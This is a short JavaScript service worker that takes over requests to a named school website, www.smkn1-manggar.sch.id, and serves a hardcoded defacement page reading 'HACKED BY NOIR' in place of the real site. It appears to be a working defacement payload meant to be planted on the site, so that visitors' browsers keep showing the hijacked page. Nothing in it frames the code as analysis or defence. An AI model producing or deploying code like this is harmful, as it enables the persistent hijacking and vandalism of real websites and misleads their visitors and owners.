const CACHE = 'v1';
const FAKE_HTML = `
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>www.smkn1-manggar.sch.id</title>
<style>
html,body{margin:0;height:100%;overflow:hidden;background:#000 url('https://i.ibb.co/6yV0Z5p/noir-face.jpg') center/cover}
#teks{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:8vw;font-family:monospace;text-shadow:0 0 30px #f00;animation:pulse .5s infinite}
@keyframes pulse{0%,100%{opacity:.2}50%{opacity:1}}
small{display:block;font-size:3vw;margin-top:1em}
</style>
</head>
<body>
<div id="teks">HACKED BY NOIR<br><small>Nothing is real.</small></div>
</body>
</html>
`;

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => self.clients.claim());

self.addEventListener('fetch', e => {
  const url = new URL(e.request.url);
  if (url.hostname === 'www.smkn1-manggar.sch.id') {
    e.respondWith(
      new Response(FAKE_HTML, {
        headers: { 'Content-Type': 'text/html' }
      })
    );
  }
});